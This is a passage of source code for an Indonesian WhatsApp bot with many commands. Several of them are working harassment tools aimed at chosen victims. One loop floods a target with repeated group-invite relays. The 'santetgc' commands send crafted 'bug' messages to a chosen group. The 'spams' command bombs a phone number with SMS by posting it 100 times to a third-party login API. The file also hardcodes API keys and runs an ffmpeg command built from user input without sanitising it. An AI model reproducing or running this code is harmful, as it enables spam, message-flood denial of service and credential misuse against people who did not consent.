vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(10000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(12000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'santetgc': {
      if (!isCreator) return tolakk(mess.OnlyOwner)
let good = text.split(',');
if (good.length < 2) return m.reply(`*Masukan Input Dengan Benar!*\n\n*Cara :*\n${prefix + command} id,jumlah\n\n*Contoh :*\n${prefix + command} 129xxx@g.us,5\n\n`)
if (!good[0]) return warning(`*Masukan ID Grup!*\n\n*Cara :*\n${prefix + command} id,jumlah\n\n*Contoh :*\n${prefix + command} 172xxx@g.us,5\n\n`)
if (!good[1]) return warning(`*Masukan Jumlah Yang Dikirim!*\n\n*Cara :*\n${prefix + command} id,jumlah\n\n*Contoh :*\n${prefix + command} 172xxx@g.us,5\n\n`)
m.reply(`*[ </> ]* Mengirimkan ${command}...`)
await sleep(1000)
gcbug(good[0], good[1])
await sleep(2000)
m.reply(`*[ </> ]* Done sent!`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'santetgc2': {
if (!text) return warning('Masukan ID Grup\n\n*Contoh:*\n.santetgc2 1775885477557@g.us')
if (!q.includes("@")) return warning('Masukan ID Grup\n\n*Contoh:*\n.santetgc2 1775885477557@g.ust')
async function buggi(judul, teks, buttontext, buttonid, target) {
let msg = generateWAMessageFromContent(target, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: teks
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: footxt
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: judul,
            subtitle: "Yahya Almuthahar",
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":${buttontext},\"id\":${buttonid}}`
              }
           ],
          })
        })
    }
  }
}, {})

await vreden.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
buggi("Assalamualaikum", `Gak jawab dosa`, "Waalaikum salam", "salam", text)
await sleep(2000)
buggi("Kenalin Member Baru", `Gak jawab dosa`, "Waalaikum salam", "salam", text)
await sleep(4000)
buggi("Kok Sepi", `Gak jawab dosa`, "Waalaikum salam", "salam", text)
await sleep(6000)
buggi("Pada Kemana", `Gak jawab dosa`, "Waalaikum salam", "salam", text)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'spams': {
if (!isCreator) return tolakk(mess.OnlyOwner)
const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || text) {
if (froms.startsWith('08')) return reply('Awali nomor dengan +62')
if (froms.startsWith('+6285600793871')) return reply('Tidak bisa spam ke nomor ini!')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS)`);
});
}
} else m.reply(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +6281214281312`)
m.reply(`spam sms/call akan di kirim ke no target`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'intro':{
var intro =`⸙‹•══════════════♡᭄
│       *「 Kartu Intro 」*
│ *Nama     :* 
│ *Gender   :* 
│ *Umur      :* 
│ *Hobby    :* 
│ *Kelas      :* 
│ *Asal         :* 
│ *Agama    :* 
|  *Status     :* 
╰═════ꪶ ۪⸙ ━ ━ ━ ━ ꪶ ̷⸙
`
vreden.sendMessage(m.chat, {text: intro }, {quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tes': case 'test':
addCountCmd('tes', m.sender, _cmd)
vreden.sendMessage(m.chat, {text: `*Runtime* :\n${runtime(process.uptime())}`}, {quoted: fconver})
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'bokep': {
const fs = require('fs');
if (!m.isGroup)return warning(mess.OnlyGrup)
if (!isCreator&&!isPremium) return tolakk('Tobat Bro Jangan Bokep Mulu:v')
await await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let istighfar = fs.readFileSync('./media/Astaghfirullah.mp4')
let ban = m.mentionedJid[0] || m.sender || conn.parseMention(args[0]) || (text.replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';
await vreden.sendFile(ban, istighfar, 'astagfirullah.mp4', `Tobat Broo:v`, m)
return m.reply(`Silahkan Cek Di Private Chat:v`) 
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'listbahasa':
addCountCmd('listbahasa', m.sender, _cmd)
var clear = ["auto", "isSupported", "getCode"]
var teks = `List Bahasa Yang Tersedia\n\n`
for (let i in translate.languages) {
if (!clear.includes(i)) {
teks += `*${i}* untuk ${translate.languages[i]}\n`
}
}
m.reply(teks)
db.data.users[m.sender].exp += await randomNomor(20)
break
//━━━━━━━━━━━━━━━[ OPEN AI ]━━━━━━━━━━━━━━━━━//
case 'differentme': {//Fix Qioo
if (!isCreator&&!isPremium) return tolakk(mess.OnlyPrem)
if (!quoted) return warning(`Fotonya Mana?`)
if (!/image/.test(mime)) return warning(`Send/Reply Foto Dengan Caption ${prefix + command}`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try{
const media = await vreden.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPh(media)
const img = await fetch (`https://skizo.tech/api/aimirror?&url=${anu}&filter=${text}&apikey=${setting.XznKey}`) 
const p = await img.json()
if (p.status !== 200) throw 'Mana gakada'
const imgs = p.generated_image_addresses
const capt = p.time_processing
vreden.sendMessage(m.chat, { image: { url: imgs }, caption: `Done Bruh\nWaktu Selesai ${capt}`}, { quoted: m})
}catch (error) {
m.reply(`Masukkan Nama Filter Yang Valid!\nAtau gunakan foto lain\nList Filter :\n- anime_2d\n- cartoon_3d\n- pretty_soldier\n- bizarre\n- romance_comic\n- maid_dressing\n- superhero_comic\n- watercolor\n- doodle\n- america_comic\n- starry_girl`)
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'differentme2': {//Fix Qioo
if (!isCreator&&!isPremium) return tolakk(mess.OnlyPrem)
if (!quoted) return warning(`Fotonya Mana?`)
if (!/image/.test(mime)) return warning(`Send/Reply Foto Dengan Caption ${prefix + command}`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try{
const media = await vreden.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPh(media)
const img = await fetch (`https://skizo.tech/api/aimirrorvip?&url=${anu}&filter=${text}&apikey=${setting.XznKey}`) 
const p = await img.json()
if (p.status !== 200) throw 'Mana gakada'
const imgs = p.generated_image_addresses
const capt = p.time_processing
vreden.sendMessage(m.chat, { image: { url: imgs }, caption: `Done Bruh\nWaktu Selesai ${capt}`}, { quoted: m})
}catch (error) {
m.reply(`Masukkan Nama Filter Yang Valid!\nAtau gunakan foto lain\nList Filter :\n- gta5\n- dball\n- naruto\n- cyber\n- killer\n- kyoto\n- bikini\n- iron`)
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'animediffusion4': case 'animedif4': case 'animediff4':{
if (!isCreator&&!isPremium) return tolakk(mess.OnlyPrem)
if (!text) return warning(`Masukan Promptnya\nContoh:\n ${prefix+command} ultra realistic close up portrait ((beautiful pale cyberpunk female with heavy black eyeliner)), blue eyes, shaved side haircut, hyper detail, cinematic lighting, magic neon, dark red city, Canon EOS R3, nikon, f/1.4, ISO 200, 1/160s, 8K, RAW, unedited, symmetrical balance, in-frame, 8K`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
const params = {
model: "dreamlike-anime-1.0.safetensors [4520e090]",
prompt: text,
style_preset: "fantasy-art",
steps: 20,
cfg_scale: 7,
seed: -1,
upscale: true,
sampler: "DPM++ 2M Karras",
width: 1024,
height: 1024
}
const generate = await txt2img(params);
await sleep(30000)
const result = await getJobs(generate.job);
await vreden.sendMessage(m.chat, {image: { url: result.imageUrl }, caption: `Anime Diffusion V4🍟`},{quoted: m})
} catch (e) {
m.reply(eror)
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'animediffusion3': case 'animedif3': case 'animediff3':{
if (!isCreator&&!isPremium) return tolakk(mess.OnlyPrem)
if (!text) return warning(`Masukan Promptnya\nContoh:\n ${prefix+command} ultra realistic close up portrait ((beautiful pale cyberpunk female with heavy black eyeliner)), blue eyes, shaved side haircut, hyper detail, cinematic lighting, magic neon, dark red city, Canon EOS R3, nikon, f/1.4, ISO 200, 1/160s, 8K, RAW, unedited, symmetrical balance, in-frame, 8K`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
const params = {
model: "dreamlike-anime-1.0.safetensors [4520e090]",
prompt: text,
style_preset: "digital-art",
steps: 20,
cfg_scale: 7,
seed: -1,
upscale: true,
sampler: "DPM++ 2M Karras",
width: 1024,
height: 1024
}
const generate = await txt2img(params);
await sleep(30000)
const result = await getJobs(generate.job);
await vreden.sendMessage(m.chat, {image: { url: result.imageUrl }, caption: `Anime Diffusion V3🍟`},{quoted: m})
} catch (e) {
m.reply(eror)
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'animediffusion2': case 'animedif2': case 'animediff2':{
if (!isCreator&&!isPremium) return tolakk(mess.OnlyPrem)
if (!text) return warning(`Masukan Promptnya\nContoh:\n ${prefix+command} ultra realistic close up portrait ((beautiful pale cyberpunk female with heavy black eyeliner)), blue eyes, shaved side haircut, hyper detail, cinematic lighting, magic neon, dark red city, Canon EOS R3, nikon, f/1.4, ISO 200, 1/160s, 8K, RAW, unedited, symmetrical balance, in-frame, 8K`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
const params = {
model: "dreamlike-anime-1.0.safetensors [4520e090]",
prompt: text,
style_preset: "anime",
steps: 20,
cfg_scale: 7,
seed: -1,
upscale: true,
sampler: "DPM++ 2M Karras",
width: 1024,
height: 1024
}
const generate = await txt2img(params);
await sleep(30000)
const result = await getJobs(generate.job);
await vreden.sendMessage(m.chat, {image: { url: result.imageUrl }, caption: `Anime Diffusion V2🍟`},{quoted: m})
} catch (e) {
m.reply(eror)
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'animediffusion': case 'animedif': case 'animediff':{
if (!isCreator&&!isPremium) return tolakk(mess.OnlyPrem)
if (!text) return warning(`Masukan Promptnya\nContoh:\n ${prefix+command} ultra realistic close up portrait ((beautiful pale cyberpunk female with heavy black eyeliner)), blue eyes, shaved side haircut, hyper detail, cinematic lighting, magic neon, dark red city, Canon EOS R3, nikon, f/1.4, ISO 200, 1/160s, 8K, RAW, unedited, symmetrical balance, in-frame, 8K`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
const params = {
model: "EimisAnimeDiffusion_V1.ckpt [4f828a15]",
prompt: text,
style_preset: "anime",
steps: 20,
cfg_scale: 7,
seed: -1,
upscale: true,
sampler: "DPM++ 2M Karras",
width: 1024,
height: 1024
}
const generate = await txt2img(params);
await sleep(30000)
const result = await getJobs(generate.job);
await vreden.sendMessage(m.chat, {image: { url: result.imageUrl }, caption: `Anime Diffusion🍟`},{quoted: m})
} catch (e) {
m.reply(eror)
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'diffusion': case 'stabledif': case 'diff':{
if (!isCreator&&!isPremium) return tolakk(mess.OnlyPrem)
if (!text) return warning(`Masukan Promptnya\nContoh:\n ${prefix+command} ultra realistic close up portrait ((beautiful pale cyberpunk female with heavy black eyeliner)), blue eyes, shaved side haircut, hyper detail, cinematic lighting, magic neon, dark red city, Canon EOS R3, nikon, f/1.4, ISO 200, 1/160s, 8K, RAW, unedited, symmetrical balance, in-frame, 8K`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
const params = {
model: "dreamlike-diffusion-1.0.safetensors [5c9fd6e0]",
prompt: text,
style_preset: "3d-model",
steps: 20,
cfg_scale: 7,
seed: -1,
upscale: true,
sampler: "DPM++ 2M Karras",
width: 1024,
height: 1024
}
const generate = await txt2img(params);
await sleep(30000)
const result = await getJobs(generate.job);
await vreden.sendMessage(m.chat, {image: { url: result.imageUrl }, caption: `Diffusion Image🍟`},{quoted: m})
} catch (e) {
m.reply(eror)
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'txt2video': case 'text2video': {//Fix Qioo
if (!text) return reply(`Masukan Prompt`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let old = new Date()
let emi = await fetchJson(`https://api.maelyn.my.id/api/txt2video?prompt=${text}&apikey=SvbxiWHTmt`)
vreden.sendMessage(m.chat, { video: { url: emi.result.name }, caption: `*🍟 Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: fcall })
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'text2img': case 'txt2img':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
const input_data = await listModels();
const samplr = await listSampler();
const styler = await getModels();
let [urutan, tema] = text.split("|")
try {
let data = input_data.map((item, index) => ({
            title: item.replace(/[_-]/g, ' ').replace(/\..*/, ''),
            id: item
        }));
if (!urutan) return m.reply(`Masukan models!\n\n*Contoh:*\n${prefix + command} [nomor]|[prompt]\n\n*Pilih angka yg ada*\n` + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"))
        if (isNaN(urutan)) return m.reply(`Masukan Models Yang Valid!\n\n*Contoh:*\n${prefix + command} [nomor]|[prompt]\n\n*Pilih angka yg ada*\n` + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"))
        if (urutan > data.length) return m.reply(`Masukan Models Yang Valid!\n\n*Contoh:*\n${prefix + command} [nomor]|[prompt]\n\n*Pilih angka yg ada*\n` + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"))
        if (!tema) return warning(`*Masukan Prompt!*!\n\nContoh:\n${prefix + command} [nomor]|[prompt]`)
        let out = data[urutan - 1].id
        await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
        const samp = await pickRandom(samplr)
        const sty = await pickRandom(styler[10].enum)
        const params = {
    model: out,
    prompt: tema,
    style_preset: sty,
    steps: 20,
    cfg_scale: 7,
    seed: -1,
    upscale: true,
    sampler: samp,
    width: 1024,
    height: 1024
  }
const generate = await txt2img(params);
await sleep(30000)
const result = await getJobs(generate.job);
await vreden.sendMessage(m.chat, {image: { url: result.imageUrl }, caption: `*Image Effect*\n${out} 🍟`},{quoted: m})
} catch (error) {
m.reply("*Terjadi Kesalahan!*\n\n" + error)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'aiscene': {//Fix Qioo
if (!isCreator&&!isPremium) return tolakk(mess.OnlyPrem)
if (!quoted) return warning(`Fotonya Mana?`)
if (!/image/.test(mime)) return warning(`Send/Reply Foto Dengan Caption ${prefix + command}`)
m.reply('Proses')
const media = await vreden.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPh(media)
vreden.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/aiscene?url=${anu}&apikey=${setting.XznKey}` }, caption: 'Done Bruh Kalo Jelek Maapin Ya:<'}, { quoted: m})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'toanime': case 'jadianime': {//Fix Qioo
if (!isCreator&&!isPremium) return tolakk(mess.OnlyPrem)
if (!quoted) return warning(`Fotonya Mana?`)
if (!/image/.test(mime)) return warning(`Send/Reply Foto Dengan Caption ${prefix + command}`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
const media = await vreden.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPh(media)
vreden.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/toanime?url=${anu}&apikey=${setting.XznKey}` }, caption: 'Done Jadi Anime Ayangg >///<'}, { quoted: m})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'nobg': case 'imagenobg': case 'removebg': case 'remove-bg': {
	    if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ["5DDnKGKgorK5pkkv5qe4XD7k", "jQTzgibFtuJxjp7XW656oTdP", "8zYhdcHZXFMZir7sAUuDBroW"]
	    let apinobg = await pickRandom(apirnobg)
	    hmm = await 'remobg-'+getRandom('')
	    localFile = await vreden.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './sticker/hremo-'+getRandom('.png')
	    await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
	    await remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    vreden.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: "*[ V1 ]* Remove Background 🍟"}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    db.data.users[m.sender].exp += await randomNomor(20)
break
case 'resize': {
if (!q) return warning(`Masukan ukuran panjangxlebar, contoh ${prefix+command} 300x300`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
let panjang = q.split('x')[0] 
let lebar = q.split('x')[1] 
let media = await vreden.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.jpeg')
exec(`ffmpeg -i ${media} -vf scale=${panjang}:${lebar} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return m.reply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
await vreden.sendMessage(m.chat, {mimetype: 'image/jpeg', image: buffer453, caption: `Done Ayang>///<`}, { quoted: fconver })
fs.unlinkSync(ran)
})
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'remini2': case 'hd2': case 'hdr2': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!quoted) return warning(`Fotonya Mana?`)
if (!/image/.test(mime)) return warning(`Send/Reply Foto Dengan Caption ${prefix + command}`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
if (/remini/.test(command)) cap = `*Type :* Ai Remini 🖼️\n*Result :* Succes ✅`
if (/hd/.test(command)) cap = `*Type :* Ai HD Foto 📸\n*Result :* Succes ✅`
if (/hdr/.test(command)) cap = `*Type :* Ai HDR 🖼️\n*Result :* Succes ✅`
let media = await vreden.downloadAndSaveMediaMessage(quoted);
let anu = await TelegraPh(media);
try {
const result = await remini2(anu)
vreden.sendMessage(m.chat, { image: { url: result.result_url }, caption: cap }, { quoted: m })
} catch (error) {
console.error(error);
}
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'remini': case 'hd': case 'hdr': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!quoted) return warning(`Fotonya Mana?`)
if (!/image/.test(mime)) return warning(`Send/Reply Foto Dengan Caption ${prefix + command}`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
if (/remini/.test(command)) cap = `*Type :* Remini 🖼️\n*Result :* Succes ✅`
if (/hd/.test(command)) cap = `*Type :* HD Photo 📸\n*Result :* Succes ✅`
if (/hdr/.test(command)) cap = `*Type :* HD Resolusi 🖼️\n*Result :* Succes ✅`
let media = await quoted.download()
let proses = await remini(media, "enhance");
vreden.sendMessage(m.chat, { image: proses, caption: `${cap}` }, { quoted: m})
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'wink': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!quoted) return warning(`Fotonya Mana?`)
if (!/image/.test(mime)) return warning(`Send/Reply Foto Dengan Caption ${prefix + command}`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let media = await quoted.download()
let prosess = await remini(media, "enhance");
let proses = await remini(prosess, "enhance");
vreden.sendMessage(m.chat, { image: proses, caption: `*Type :* Wink 🐻\n*Result :* Succes ✅` }, { quoted: m})
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'recolor': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!quoted) return warning(`Fotonya Mana?`)
if (!/image/.test(mime)) return warning(`Send/Reply Foto Dengan Caption ${prefix + command}`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let media = await quoted.download()
let proses = await processing(media, "recolor");
vreden.sendMessage(m.chat, { image: proses, caption: `*Type :* Recolor 🎨\n*Result :* Succes ✅` }, { quoted: m})
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'dehaze': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!quoted) return warning(`Fotonya Mana?`)
if (!/image/.test(mime)) return warning(`Send/Reply Foto Dengan Caption ${prefix + command}`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let media = await quoted.download()
let proses = await processing(media, "dehaze");
vreden.sendMessage(m.chat, { image: proses, caption: `*Type :* Dehaze 🏴\n*Result :* Succes ✅` }, { quoted: m})
}
